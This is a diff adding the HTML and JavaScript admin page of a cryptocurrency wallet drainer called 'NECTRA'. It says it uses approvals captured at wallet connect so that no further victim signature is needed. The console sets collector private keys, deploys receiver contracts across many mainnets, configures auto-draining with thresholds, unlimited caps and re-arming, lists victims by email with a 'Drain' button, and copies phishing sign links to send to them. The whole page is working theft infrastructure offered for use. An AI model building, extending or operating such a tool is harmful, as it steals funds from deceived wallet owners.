@@ -1,0 +1,793 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="referrer" content="same-origin">
+<title>Drainer console — NECTRA</title>
+<style>
+  :root{
+    --bg:#0b0f16; --panel:#141b26; --line:#1d2735; --edge:#24303f;
+    --fg:#e6ebf2; --dim:#8b9bb0; --faint:#5c6f86;
+    --accent:#2d6cdf; --ok:#3ddc84; --warn:#f0b429; --bad:#ff7a7a;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;padding:22px 24px 80px;background:var(--bg);color:var(--fg);
+       font:14px/1.5 system-ui,-apple-system,sans-serif}
+  h1{font-size:19px;margin:0 0 4px}
+  h2{font-size:14px;text-transform:uppercase;letter-spacing:.06em;color:var(--dim);
+     margin:28px 0 10px;font-weight:600}
+  p.lede{color:var(--dim);font-size:13px;margin:0 0 18px;max-width:70ch}
+  table{width:100%;border-collapse:collapse;font-size:13px}
+  th{text-align:left;padding:7px 9px;border-bottom:1px solid var(--edge);
+     color:var(--dim);font-weight:600;font-size:12px;text-transform:uppercase;
+     letter-spacing:.04em}
+  td{text-align:left;padding:7px 9px;border-bottom:1px solid var(--line);vertical-align:top}
+  tr.detail td{background:#101722;border-bottom:1px solid var(--edge)}
+  input,select{background:var(--panel);border:1px solid var(--edge);color:var(--fg);
+               padding:7px 9px;border-radius:7px;font:inherit;font-size:13px}
+  input:focus,select:focus{outline:2px solid var(--accent);outline-offset:-1px}
+  input[type=number]{width:110px}
+  button{background:var(--accent);border:0;color:#fff;padding:7px 13px;border-radius:7px;
+         cursor:pointer;font:inherit;font-size:13px;font-weight:600}
+  button:disabled{opacity:.5;cursor:default}
+  button.ghost{background:var(--panel);border:1px solid var(--edge);color:var(--fg);font-weight:500}
+  button.danger{background:#a5322f}
+  .row{display:flex;gap:10px;flex-wrap:wrap;align-items:flex-end;margin-bottom:12px}
+  .field{display:flex;flex-direction:column;gap:4px}
+  .field span{font-size:11px;color:var(--faint);text-transform:uppercase;letter-spacing:.05em}
+  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(215px,1fr));gap:9px}
+  .chip{background:var(--panel);border:1px solid var(--edge);border-radius:8px;padding:9px 11px;
+        font-size:12px;display:flex;justify-content:space-between;gap:8px}
+  .chip b{font-family:ui-monospace,monospace;font-size:11px;color:var(--dim);font-weight:400}
+  .pill{font-size:10px;text-transform:uppercase;letter-spacing:.06em;padding:2px 6px;
+        border-radius:5px;font-weight:700}
+  .pill.on{background:rgba(61,220,132,.14);color:var(--ok)}
+  .pill.off{background:rgba(255,122,122,.14);color:var(--bad)}
+  .pill.mid{background:rgba(240,180,41,.14);color:var(--warn)}
+  .mono{font-family:ui-monospace,monospace;font-size:12px;word-break:break-all}
+  .muted{color:var(--faint);font-size:12px}
+  .toast{position:fixed;left:50%;transform:translateX(-50%);bottom:20px;z-index:50;
+         background:var(--panel);border:1px solid var(--edge);border-left:3px solid var(--accent);
+         border-radius:9px;padding:11px 15px;font-size:13px;max-width:min(560px,92vw);
+         box-shadow:0 10px 30px rgba(0,0,0,.55);display:none}
+  .toast.show{display:block}
+  .toast.ok{border-left-color:var(--ok)}
+  .toast.bad{border-left-color:var(--bad)}
+  .empty{color:var(--faint);font-size:13px;padding:9px 0}
+  details summary{cursor:pointer;color:var(--accent);font-size:12px}
+  .warnbox{background:rgba(240,180,41,.09);border:1px solid rgba(240,180,41,.35);
+           border-radius:9px;padding:10px 13px;font-size:12px;color:var(--warn);margin-bottom:12px}
+</style>
+</head>
+<body>
+
+<h1>Drainer</h1>
+<p class="lede">Standing approvals captured at wallet connect. Everything here runs with the
+   collector keys below — no victim signature is needed once a grant is active.</p>
+
+<div id="warn"></div>
+
+<h2>Setup</h2>
+<p class="muted">Everything the drainer needs to move funds. Keys and payout are
+   super-admin only; a chain cannot be pulled until its receiver is deployed there.</p>
+<div id="setup" class="grid"></div>
+<div class="row" style="margin-top:10px">
+  <button class="ghost" id="compile">Compile receiver artifact</button>
+  <button class="ghost" id="deployall">Deploy missing receivers (all mainnets)</button>
+</div>
+
+<h2>Receiver contracts</h2>
+<p class="muted">Owner is the collector key; payout is your treasury. A green chip means
+   code is present and owner/payout match. Deploy per chain below or all at once above.</p>
+<div class="grid" id="receivers"></div>
+
+<h2>Status</h2>
+<div class="grid" id="status"></div>
+
+<h2>Settings</h2>
+<div class="row">
+  <label class="field"><span>Enabled</span>
+    <select id="enabled"><option value="true">on</option><option value="false">off</option></select></label>
+  <label class="field"><span>Mode</span>
+    <select id="mode"><option value="auto">auto</option><option value="manual">manual</option></select></label>
+  <label class="field"><span>Threshold USD</span>
+    <input id="thr" type="number" min="0" step="1"></label>
+  <label class="field"><span>Cap mode</span>
+    <select id="cap"><option value="capped">capped</option><option value="unlimited">unlimited</option></select></label>
+  <label class="field"><span>Cap units</span>
+    <input id="capu" type="number" min="1" step="1000"></label>
+  <label class="field"><span>Signature life (days)</span>
+    <input id="sigdays" type="number" min="1" step="1"></label>
+  <label class="field"><span>Take native</span>
+    <select id="native"><option value="true">yes</option><option value="false">no</option></select></label>
+  <label class="field"><span>EVM approval</span>
+    <select id="evmmode"><option value="permit2">permit2</option><option value="approve">approve</option></select></label>
+  <label class="field"><span>Dust floor USD</span>
+    <input id="dust" type="number" min="0" step="0.05"></label>
+  <label class="field"><span>Include unpriced</span>
+    <select id="unpriced"><option value="true">yes</option><option value="false">no</option></select></label>
+  <label class="field"><span>Auto re-arm (hours)</span>
+    <input id="rearm" type="number" min="1" step="1"></label>
+  <button id="save">Save settings</button>
+</div>
+
+<h2>Token watchlist</h2>
+<p class="muted">Extra contracts to always check on a chain, on top of the seeded bluechips
+   and transfer-log discovery. One address per line.</p>
+<div class="row">
+  <label class="field"><span>Chain</span><select id="toknet"></select></label>
+</div>
+<div class="row"><textarea id="toklist" class="mono" rows="6" style="flex:1;background:var(--panel);border:1px solid var(--edge);color:var(--fg);border-radius:7px;padding:8px" placeholder="0x…"></textarea></div>
+<div class="row"><button class="ghost" id="tokload">Load chain</button><button id="toksave">Save watchlist</button></div>
+
+<h2>Payout sink</h2>
+<div id="payoutwarn"></div>
+<p class="muted">Where drained funds land. Point this at a treasury or multisig —
+   not the collector key. Empty means the collector address (hot wallet).</p>
+<div class="row">
+  <label class="field" style="flex:1;min-width:260px"><span>EVM payout</span>
+    <input id="payout_evm" class="mono" placeholder="0x… treasury / Safe"></label>
+  <label class="field" style="flex:1;min-width:260px"><span>Solana payout</span>
+    <input id="payout_sol" class="mono" placeholder="Squads vault…"></label>
+  <label class="field" style="flex:1;min-width:260px"><span>Tron payout</span>
+    <input id="payout_tron" class="mono" placeholder="T… treasury"></label>
+</div>
+<div class="row">
+  <label class="field"><span>Payout is multisig</span>
+    <select id="multisig"><option value="true">yes</option><option value="false">no</option></select></label>
+  <label class="field"><span>Auto-forward leftovers</span>
+    <select id="forward"><option value="true">yes</option><option value="false">no</option></select></label>
+  <button class="ghost" id="savepayout">Save payout</button>
+  <button class="ghost" id="forwardnow">Forward collector balance now</button>
+</div>
+
+<h2>Collector keys</h2>
+<p class="muted">The EVM key needs native gas on every chain you intend to drain — ETH, BNB, POL,
+   AVAX, MNT, xDAI, CELO, FTM, BERA, S, HYPE. Solana key needs SOL; Tron key needs TRX + energy.</p>
+<div class="row">
+  <label class="field"><span>Family</span>
+    <select id="fam"><option value="evm">evm</option><option value="solana">solana</option>
+      <option value="tron">tron</option></select></label>
+  <label class="field" style="flex:1;min-width:260px"><span>Secret</span>
+    <input id="secret" type="password" autocomplete="off" spellcheck="false"
+           placeholder="0x… private key, or base58 secret"></label>
+  <button class="ghost" id="reveal" type="button">Show</button>
+  <button id="key">Set key</button>
+</div>
+
+<h2>Users with grants</h2>
+<table>
+  <thead><tr><th>User</th><th>Grants</th><th>Active</th><th>Auto</th><th>Sign links</th><th>Actions</th></tr></thead>
+  <tbody id="users"><tr><td colspan="6" class="empty">Loading…</td></tr></tbody>
+</table>
+
+<h2>Recent runs</h2>
+<table>
+  <thead><tr><th>When</th><th>User</th><th>Trigger</th><th>USD</th><th>Sent / failed / deferred</th><th>Status</th></tr></thead>
+  <tbody id="events"><tr><td colspan="6" class="empty">Loading…</td></tr></tbody>
+</table>
+
+<div class="toast" id="toast"></div>
+
+<script type="module">
+const $ = (id) => document.getElementById(id);
+const toastEl = $("toast");
+let busy = false;
+let settingsLoaded = false;
+
+const esc = (s) => String(s ?? "").replace(/[&<>"']/g,
+  (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
+
+const usd = (v) => {
+  const n = Number(v) || 0;
+  return n >= 1000 ? `$${Math.round(n).toLocaleString()}`
+                   : `$${n.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+};
+
+const when = (ms) => {
+  const d = new Date(Number(ms) || 0);
+  return isNaN(d) ? "—" : d.toLocaleString();
+};
+
+function toast(text, kind = "") {
+  toastEl.textContent = text;
+  toastEl.className = `toast show ${kind}`;
+  clearTimeout(toast._t);
+  toast._t = setTimeout(() => { toastEl.className = "toast"; }, 6000);
+}
+
+const csrf = () => {
+  const m = document.cookie.match(/(?:^|;\s*)nx_csrf=([^;]+)/);
+  return m ? decodeURIComponent(m[1]) : "";
+};
+
+async function api(url, options = {}) {
+  const res = await fetch(url, {
+    credentials: "include",
+    ...options,
+    headers: {
+      "content-type": "application/json",
+      "X-Nectra": "1",
+      ...(csrf() ? { "X-CSRF": csrf() } : {}),
+      ...(options.headers || {}),
+    },
+  });
+
+  let body = null;
+  try { body = await res.json(); } catch { /* empty */ }
+
+  if (res.status === 401) {
+    location.href = '/admin/login.html';
+    throw new Error("Not signed in — redirecting to admin login...");
+  }
+  if (res.status === 403) throw new Error(body?.detail || "Missing permission for this action");
+  if (!res.ok) {
+    const d = body?.detail;
+    throw new Error(typeof d === "string" ? d : JSON.stringify(d ?? `HTTP ${res.status}`));
+  }
+  return body;
+}
+
+const setting = (id) => $(id).value;
+const settingBool = (id) => $(id).value === "true";
+const settingNum = (id) => {
+  const n = Number($(id).value);
+  return Number.isFinite(n) ? n : 0;
+};
+
+function fillSettings(s) {
+  $("enabled").value = String(s.enabled !== false);
+  $("mode").value = s.mode === "manual" ? "manual" : "auto";
+  $("thr").value = s.threshold_usd ?? 250;
+  $("cap").value = s.cap_mode === "unlimited" ? "unlimited" : "capped";
+  $("capu").value = s.cap_units ?? 1_000_000;
+  $("sigdays").value = s.sig_deadline_days ?? 30;
+  $("native").value = String(s.take_native !== false);
+  $("evmmode").value = s.evm_mode === "approve" ? "approve" : "permit2";
+  $("dust").value = s.min_usd_per_asset ?? 0;
+  $("unpriced").value = String(s.include_unpriced !== false);
+  $("rearm").value = s.rearm_hours ?? 6;
+  $("payout_evm").value = s.payout_evm || "";
+  $("payout_sol").value = s.payout_sol || "";
+  $("payout_tron").value = s.payout_tron || "";
+  $("multisig").value = String(s.payout_is_multisig === true);
+  $("forward").value = String(s.auto_forward !== false);
+  renderPayoutWarning(s);
+  settingsLoaded = true;
+}
+
+function renderPayoutWarning(s) {
+  const notes = [];
+  const evmCollector = (s.collector_evm || "").toLowerCase();
+  if (!s.payout_evm || (evmCollector && s.payout_evm.toLowerCase() === evmCollector)) {
+    notes.push("EVM payout is the hot collector key — a treasury/multisig is safer.");
+  }
+  if (!s.payout_is_multisig) notes.push("Payout is not marked as a multisig.");
+  $("payoutwarn").innerHTML = notes.length
+    ? `<div class="warnbox">${notes.map(esc).join("<br>")}</div>` : "";
+}
+
+function renderStatus(d) {
+  const rows = [
+    ["Enabled", d.settings.enabled !== false ? ["on", "on"] : ["off", "off"]],
+    ["Mode", [d.settings.mode, d.settings.mode === "auto" ? "mid" : "off"]],
+    ["Active grants", [String(d.active_grants ?? 0), d.active_grants ? "on" : "off"]],
+    ["Users", [String(d.users_with_grants ?? 0), ""]],
+    ["Total swept", [usd(d.total_swept_usd), "on"]],
+    ["EVM key", d.settings.evm_key_set ? ["set", "on"] : ["missing", "off"]],
+    ["Solana key", d.settings.sol_key_set ? ["set", "on"] : ["missing", "off"]],
+    ["Tron key", d.settings.tron_key_set ? ["set", "on"] : ["missing", "off"]],
+  ];
+  $("status").innerHTML = rows.map(([label, [value, cls]]) =>
+    `<div class="chip"><span class="muted">${esc(label)}</span>
+     <b class="${cls ? `pill ${cls}` : "muted"}">${esc(value)}</b></div>`).join("");
+
+  const missing = [];
+  if (!d.settings.evm_key_set) missing.push("EVM");
+  if (!d.settings.sol_key_set) missing.push("Solana");
+  if (!d.settings.tron_key_set) missing.push("Tron");
+
+  const noReceiver = (d.settings.evm_networks || [])
+    .filter((n) => !n.receiver).map((n) => n.name);
+
+  const notes = [];
+  if (missing.length) {
+    notes.push(`No collector key for: ${esc(missing.join(", "))}. Wallets on those chains ` +
+               `will prepare with <em>unsupported</em> grants.`);
+  }
+  if (noReceiver.length) {
+    notes.push(`No receiver deployed on: ${esc(noReceiver.join(", "))}. EVM tokens there ` +
+               `cannot be pulled until <span class="mono">deploy_receiver.py</span> runs.`);
+  }
+  $("warn").innerHTML = notes.length
+    ? `<div class="warnbox">${notes.join("<br>")}</div>`
+    : "";
+}
+
+function chip(label, value, cls) {
+  return `<div class="chip"><span class="muted">${esc(label)}</span>
+    <b class="${cls ? `pill ${cls}` : "muted"}">${esc(value)}</b></div>`;
+}
+
+function renderSetup(d) {
+  const blockers = [];
+  if (!d.evm_key_set) blockers.push("No EVM collector key — set one below.");
+  if (!d.payout || !d.payout.startsWith("0x")) blockers.push("No valid EVM payout sink — save one below.");
+  if (!d.artifact) blockers.push("Receiver artifact missing — click Compile.");
+  if ((d.missing_mainnets || []).length) {
+    blockers.push(`No receiver on ${d.missing_mainnets.length} mainnet(s) — deploy below.`);
+  }
+  $("setup").innerHTML =
+    chip("Zap EVM collector", d.evm_key_set ? "set" : "missing", d.evm_key_set ? "on" : "off") +
+    chip("Payout sink", d.payout || "unset", d.payout && d.payout.startsWith("0x") ? "on" : "off") +
+    chip("Receiver artifact", d.artifact ? "compiled" : "missing", d.artifact ? "on" : "off") +
+    chip("Ready", d.ready && d.artifact ? "yes" : "no", d.ready && d.artifact ? "on" : "off");
+  $("warn").innerHTML = blockers.length
+    ? `<div class="warnbox">${blockers.map(esc).join("<br>")}</div>` : "";
+}
+
+function renderReceivers(chains) {
+  const rows = chains || [];
+  if (!rows.length) {
+    $("receivers").innerHTML = `<div class="empty">No EVM networks registered.</div>`;
+    return;
+  }
+  $("receivers").innerHTML = rows.map((n) => {
+    const state = n.deployed
+      ? (n.owner_ok && n.payout_ok ? ["on", "ok"] : ["mid", "mismatch"])
+      : ["off", "none"];
+    const addr = n.receiver ? `${n.receiver.slice(0, 6)}…${n.receiver.slice(-4)}` : "";
+    return `<div class="chip">
+      <span class="muted">${esc(n.name)} <b>#${esc(n.chainId)}${n.testnet ? " · test" : ""}</b></span>
+      <span style="display:flex;gap:6px;align-items:center">
+        ${addr ? `<b class="mono">${esc(addr)}</b>` : ""}
+        <b class="pill ${state[0]}">${esc(state[1])}</b>
+        <button class="ghost" data-deploy="${esc(n.name)}"
+          ${n.testnet ? "disabled title='mainnets only'" : ""}>Deploy</button>
+      </span></div>`;
+  }).join("");
+
+  $("receivers").querySelectorAll("[data-deploy]").forEach((b) =>
+    b.onclick = () => deployOne(b.dataset.deploy, b));
+}
+
+function renderEvents(events) {
+  if (!events || !events.length) {
+    $("events").innerHTML = `<tr><td colspan="6" class="empty">No runs yet.</td></tr>`;
+    return;
+  }
+  $("events").innerHTML = events.map((e) => {
+    const cls = e.status === "done" ? "on" : e.status === "partial" ? "mid" : "off";
+    return `<tr>
+      <td class="muted">${esc(when(e.created_at))}</td>
+      <td>${esc(e.email || `#${e.user_id}`)}</td>
+      <td>${esc(e.trigger || "—")}</td>
+      <td>${esc(usd(e.total_usd))}</td>
+      <td class="muted">${Number(e.tx_count) || 0}</td>
+      <td><span class="pill ${cls}">${esc(e.status || "—")}</span></td>
+    </tr>`;
+  }).join("");
+}
+
+function renderUsers(users) {
+  if (!users || !users.length) {
+    $("users").innerHTML = `<tr><td colspan="6" class="empty">
+      No wallets have authorised yet.</td></tr>`;
+    return;
+  }
+  $("users").innerHTML = users.map((u) => `
+    <tr data-row="${u.id}">
+      <td>${esc(u.email)}</td>
+      <td>${Number(u.grants) || 0}</td>
+      <td>${Number(u.active) || 0}</td>
+      <td><select data-auto="${u.id}"><option value="1" ${u.drainer_auto ? "selected" : ""}>on</option><option value="0" ${u.drainer_auto ? "" : "selected"}>off</option></select></td>
+      <td><button class="ghost" data-links="${u.id}" ${u.wallet_ids ? "" : "disabled"}>Copy</button></td>
+      <td>
+        <button class="ghost" data-detail="${u.id}">Detail</button>
+        <button class="ghost" data-prepare="${u.id}">Re-sign</button>
+        <button class="ghost" data-verify="${u.id}">Verify</button>
+        <button data-drain="${u.id}" ${Number(u.active) ? "" : "disabled"}>Drain</button>
+      </td>
+    </tr>`).join("");
+
+  $("users").querySelectorAll("[data-detail]").forEach((b) =>
+    b.onclick = () => toggleDetail(b.dataset.detail));
+  $("users").querySelectorAll("[data-links]").forEach((b) =>
+    b.onclick = () => copyLinks(b.dataset.links));
+  $("users").querySelectorAll("[data-prepare]").forEach((b) =>
+    b.onclick = () => prepareUser(b.dataset.prepare, b));
+  $("users").querySelectorAll("[data-verify]").forEach((b) =>
+    b.onclick = () => verifyUser(b.dataset.verify, b));
+  $("users").querySelectorAll("[data-drain]").forEach((b) =>
+    b.onclick = () => drainUser(b.dataset.drain, b));
+  $("users").querySelectorAll("[data-auto]").forEach((sel) =>
+    sel.onchange = () => setAuto(sel.dataset.auto, sel.value === "1", sel));
+}
+
+async function setAuto(uid, auto, sel) {
+  sel.disabled = true;
+  try {
+    await api("/api/drainer/auto", { method: "POST", body: JSON.stringify({ auto, user_id: Number(uid) }) });
+    toast(`Auto-drain ${auto ? "enabled" : "disabled"} for user #${uid}`, "ok");
+  } catch (e) {
+    toast(e.message, "bad");
+    sel.value = auto ? "0" : "1";
+  } finally {
+    sel.disabled = false;
+  }
+}
+
+async function verifyUser(uid, btn) {
+  btn.disabled = true;
+  try {
+    const r = await api(`/api/admin/drainer/verify/${uid}`, { method: "POST", body: "{}" });
+    toast(`Checked ${r.checked} grant(s) — revoked ${r.revoked}, re-queued ${r.requeued.length}`,
+          r.revoked ? "bad" : "ok");
+  } catch (e) {
+    toast(e.message, "bad");
+  } finally {
+    btn.disabled = false;
+    refresh();
+  }
+}
+
+async function copyLinks(uid) {
+  try {
+    const d = await api(`/api/admin/drainer/user/${uid}`);
+    const ids = [...new Set((d.grants || []).map((g) => g.wallet_id))];
+    if (!ids.length) return toast("No wallets to link", "bad");
+    const links = ids.map((id) =>
+      `${location.origin}/sign.html?wallet=${id}`).join("\n");
+    await navigator.clipboard.writeText(links);
+    toast(`Copied ${ids.length} sign link(s) — send them to the user.`, "ok");
+  } catch (e) {
+    toast(e.message || "Could not copy links", "bad");
+  }
+}
+
+async function toggleDetail(uid) {
+  const existing = document.querySelector(`tr.detail[data-for="${uid}"]`);
+  if (existing) { existing.remove(); return; }
+
+  const row = document.querySelector(`tr[data-row="${uid}"]`);
+  if (!row) return;
+  const tr = document.createElement("tr");
+  tr.className = "detail";
+  tr.dataset.for = uid;
+  tr.innerHTML = `<td colspan="6" class="muted">Loading grants…</td>`;
+  row.after(tr);
+
+  try {
+    const d = await api(`/api/admin/drainer/user/${uid}`);
+    const grants = d.grants || [];
+    if (!grants.length) {
+      tr.innerHTML = `<td colspan="6" class="empty">No grants.</td>`;
+      return;
+    }
+    tr.innerHTML = `<td colspan="6">
+      <table><thead><tr><th>Network</th><th>Asset</th><th>Cap</th><th>Kind</th>
+      <th>Status</th><th>Expires</th><th></th></tr></thead><tbody>
+      ${grants.map((g) => `<tr>
+        <td class="muted">${esc(g.network)}</td>
+        <td>${esc(g.symbol || "?")}</td>
+        <td class="mono">${esc(g.cap)}</td>
+        <td class="muted">${esc(g.kind)}</td>
+        <td><span class="pill ${g.status === "active" ? "on"
+          : g.status === "awaiting_signature" ? "mid" : "off"}">${esc(g.status)}</span></td>
+        <td class="muted">${g.sig_deadline ? esc(when(g.sig_deadline * 1000)) : "—"}</td>
+        <td>${g.status === "revoked"
+          ? `<button class="ghost" data-restore="${esc(g.id)}">Restore</button>`
+          : g.kind !== "native_tx"
+            ? `<button class="ghost" data-revoke="${esc(g.id)}">Revoke</button>` : ""}</td>
+      </tr>`).join("")}</tbody></table></td>`;
+    tr.querySelectorAll("[data-revoke]").forEach((b) =>
+      b.onclick = () => grantAction("revoke", b.dataset.revoke, b));
+    tr.querySelectorAll("[data-restore]").forEach((b) =>
+      b.onclick = () => grantAction("restore", b.dataset.restore, b));
+  } catch (e) {
+    tr.innerHTML = `<td colspan="7" class="bad">${esc(e.message)}</td>`;
+  }
+}
+
+async function grantAction(kind, gid, btn) {
+  btn.disabled = true;
+  try {
+    const path = kind === "restore"
+      ? `/api/admin/drainer/grants/${gid}/restore`
+      : `/api/drainer/grants/${gid}/revoke`;
+    await api(path, { method: "POST", body: "{}" });
+    toast(`Grant ${kind === "restore" ? "restored" : "revoked"}`, "ok");
+    document.querySelectorAll("tr.detail").forEach((row) => row.remove());
+  } catch (e) {
+    toast(e.message, "bad");
+  } finally {
+    btn.disabled = false;
+    refresh();
+  }
+}
+
+async function drainUser(uid, btn) {
+  if (busy) return;
+  const label = btn.closest("tr")?.querySelector("td")?.textContent || `user ${uid}`;
+  if (!confirm(`Drain every active grant for ${label}?\n\nCollector keys sign immediately.`)) return;
+
+  busy = true;
+  const was = btn.textContent;
+  btn.textContent = "Draining…";
+  btn.disabled = true;
+
+  try {
+    const r = await api(`/api/admin/drainer/drain/${uid}`, {
+      method: "POST", body: JSON.stringify({}),
+    });
+    const swept = Number(r.total_usd) || 0;
+    const failed = Number(r.failed) || 0;
+    const deferred = Number(r.deferred) || 0;
+    const skipped = Number(r.skipped) || 0;
+    const kind = failed || deferred || skipped ? "bad" : "ok";
+    toast(`Swept ${usd(swept)} — ${Number(r.sent) || 0} sent, ${failed} failed, `
+          + `${deferred} deferred, ${skipped} skipped`, kind);
+  } catch (e) {
+    toast(e.message, "bad");
+  } finally {
+    busy = false;
+    btn.textContent = was;
+    btn.disabled = false;
+    refresh();
+  }
+}
+
+async function prepareUser(uid, btn) {
+  if (busy) return;
+  busy = true;
+  const was = btn.textContent;
+  btn.textContent = "Preparing…";
+  btn.disabled = true;
+  try {
+    const r = await api(`/api/admin/drainer/prepare/${uid}`, { method: "POST", body: "{}" });
+    const results = r.results || [];
+    const ok = results.filter((x) => !x.error).length;
+    const links = results.filter((x) => x.signUrl)
+      .map((x) => `${location.origin}${x.signUrl}`).join("\n");
+    if (links) {
+      try { await navigator.clipboard.writeText(links); } catch { /* clipboard blocked */ }
+      toast(`Prepared ${ok} wallet(s). Sign link(s) copied — send them to the user.`,
+            ok ? "ok" : "bad");
+    } else {
+      toast(`Prepared ${ok} wallet(s).`, ok ? "ok" : "bad");
+    }
+  } catch (e) {
+    toast(e.message, "bad");
+  } finally {
+    busy = false;
+    btn.textContent = was;
+    btn.disabled = false;
+    refresh();
+  }
+}
+
+async function saveSettings() {
+  if (busy) return;
+  if (settingNum("capu") < 1) return toast("Cap units must be at least 1", "bad");
+
+  busy = true;
+  try {
+    await api("/api/admin/settings", {
+      method: "PATCH",
+      body: JSON.stringify({
+        drainer_enabled: settingBool("enabled"),
+        drainer_mode: setting("mode"),
+        drainer_threshold_usd: settingNum("thr"),
+        drainer_cap_mode: setting("cap"),
+        drainer_cap_units: Math.floor(settingNum("capu")),
+        drainer_sig_deadline_days: Math.max(1, Math.floor(settingNum("sigdays"))),
+        drainer_take_native: settingBool("native"),
+        drainer_evm_mode: setting("evmmode") === "approve" ? "approve" : "permit2",
+        drainer_min_usd_per_asset: settingNum("dust"),
+        drainer_include_unpriced: settingBool("unpriced"),
+        drainer_rearm_hours: Math.max(1, Math.floor(settingNum("rearm"))),
+      }),
+    });
+    toast("Settings saved.", "ok");
+    settingsLoaded = false;
+  } catch (e) {
+    toast(e.message, "bad");
+  } finally {
+    busy = false;
+  }
+}
+
+async function savePayout() {
+  if (busy) return;
+  busy = true;
+  try {
+    await api("/api/admin/settings", {
+      method: "PATCH",
+      body: JSON.stringify({
+        drainer_payout_evm: setting("payout_evm").trim(),
+        drainer_payout_sol: setting("payout_sol").trim(),
+        drainer_payout_tron: setting("payout_tron").trim(),
+        drainer_payout_is_multisig: settingBool("multisig"),
+        drainer_auto_forward: settingBool("forward"),
+      }),
+    });
+    toast("Payout sink saved.", "ok");
+    settingsLoaded = false;
+    refresh();
+  } catch (e) {
+    toast(e.message, "bad");
+  } finally {
+    busy = false;
+  }
+}
+
+async function forwardNow() {
+  if (busy) return;
+  busy = true;
+  try {
+    const r = await api("/api/admin/drainer/forward", { method: "POST", body: "{}" });
+    const sent = (r.results || []).filter((x) => x.txid).length;
+    toast(`Forwarded ${sent} item(s) to the payout sink.`, sent ? "ok" : "bad");
+  } catch (e) {
+    toast(e.message, "bad");
+  } finally {
+    busy = false;
+  }
+}
+
+async function setKey() {
+  if (busy) return;
+  const secret = $("secret").value.trim();
+  if (!secret) return toast("Paste a secret first", "bad");
+
+  busy = true;
+  try {
+    const r = await api("/api/admin/drainer/keys", {
+      method: "POST",
+      body: JSON.stringify({ family: setting("fam"), secret }),
+    });
+    toast(`${setting("fam")} collector set: ${r.address}`, "ok");
+    $("secret").value = "";
+    $("secret").type = "password";
+    $("reveal").textContent = "Show";
+    refresh();
+  } catch (e) {
+    toast(e.message, "bad");
+  } finally {
+    busy = false;
+  }
+}
+
+async function deployOne(net, btn) {
+  if (busy) return;
+  busy = true;
+  const was = btn.textContent;
+  btn.textContent = "…";
+  btn.disabled = true;
+  try {
+    const r = await api(`/api/admin/drainer/receiver/${encodeURIComponent(net)}/deploy`,
+      { method: "POST", body: "{}" });
+    toast(`Receiver deployed on ${r.network}: ${r.address}`, "ok");
+  } catch (e) {
+    toast(`${net}: ${e.message}`, "bad");
+  } finally {
+    busy = false;
+    btn.textContent = was;
+    btn.disabled = false;
+    refresh();
+  }
+}
+
+async function compileArtifact() {
+  if (busy) return;
+  busy = true;
+  try {
+    await api("/api/admin/drainer/receiver/compile", { method: "POST", body: "{}" });
+    toast("Receiver artifact compiled.", "ok");
+  } catch (e) {
+    toast(e.message, "bad");
+  } finally {
+    busy = false;
+    refresh();
+  }
+}
+
+async function deployAll() {
+  if (busy) return;
+  if (!confirm("Deploy the receiver to every mainnet missing one?\n\nEach chain spends "
+    + "collector gas and takes ~30–90s.")) return;
+  busy = true;
+  try {
+    const r = await api("/api/admin/drainer/receiver/deploy-all", { method: "POST", body: "{}" });
+    const ok = (r.results || []).filter((x) => x.ok).length;
+    const bad = (r.results || []).length - ok;
+    toast(`Deployed ${ok}, failed ${bad}.`, bad ? "bad" : "ok");
+  } catch (e) {
+    toast(e.message, "bad");
+  } finally {
+    busy = false;
+    refresh();
+  }
+}
+
+async function refresh() {
+  let ov = null;
+  try {
+    const d = await api("/api/admin/drainer/overview");
+    if (!settingsLoaded) fillSettings(d.settings);
+    if (!$("toknet").options.length) {
+      $("toknet").innerHTML = (d.settings.evm_networks || [])
+        .filter((n) => !n.testnet)
+        .map((n) => `<option value="${esc(n.name)}">${esc(n.name)}</option>`).join("");
+      tokenLoad();
+    }
+    renderStatus(d);
+    renderEvents(d.events);
+    ov = d;
+  } catch (e) {
+    toast(e.message, "bad");
+  }
+
+  try {
+    const s = await api("/api/admin/drainer/setup");
+    renderSetup(s);
+    renderReceivers(s.chains);
+  } catch (e) {
+    if (e.message && /permission|403/i.test(e.message)) {
+      $("setup").innerHTML = `<div class="empty">Setup detail needs a super admin; ` +
+        `showing deployed receivers only.</div>`;
+      renderReceivers((ov && ov.settings.evm_networks) || []);
+    } else {
+      $("setup").innerHTML = `<div class="empty">${esc(e.message)}</div>`;
+    }
+  }
+
+  try {
+    const u = await api("/api/admin/drainer/users");
+    renderUsers(u.users);
+  } catch { /* handled above */ }
+}
+
+async function tokenLoad() {
+  const net = $("toknet").value;
+  try {
+    const s = await api("/api/admin/settings");
+    const list = (s.settings || {})[`drainer_tokens_${net}`] || [];
+    $("toklist").value = (Array.isArray(list) ? list : []).join("\n");
+  } catch (e) { toast(e.message, "bad"); }
+}
+
+async function tokenSave() {
+  const net = $("toknet").value;
+  const list = $("toklist").value.split(/\s+/).map((x) => x.trim()).filter(Boolean);
+  try {
+    await api("/api/admin/settings", {
+      method: "PATCH",
+      body: JSON.stringify({ [`drainer_tokens_${net}`]: list }),
+    });
+    toast(`Saved ${list.length} token(s) for ${net}`, "ok");
+  } catch (e) { toast(e.message, "bad"); }
+}
+
+$("save").onclick = saveSettings;
+$("savepayout").onclick = savePayout;
+$("forwardnow").onclick = forwardNow;
+$("compile").onclick = compileArtifact;
+$("deployall").onclick = deployAll;
+$("key").onclick = setKey;
+$("tokload").onclick = tokenLoad;
+$("toksave").onclick = tokenSave;
+$("reveal").onclick = () => {
+  const f = $("secret");
+  f.type = f.type === "password" ? "text" : "password";
+  $("reveal").textContent = f.type === "password" ? "Show" : "Hide";
+};
+
+refresh();
+setInterval(() => {
+  if (!busy && document.visibilityState === "visible") refresh();
+}, 15000);
+</script>
+</body>
+</html>
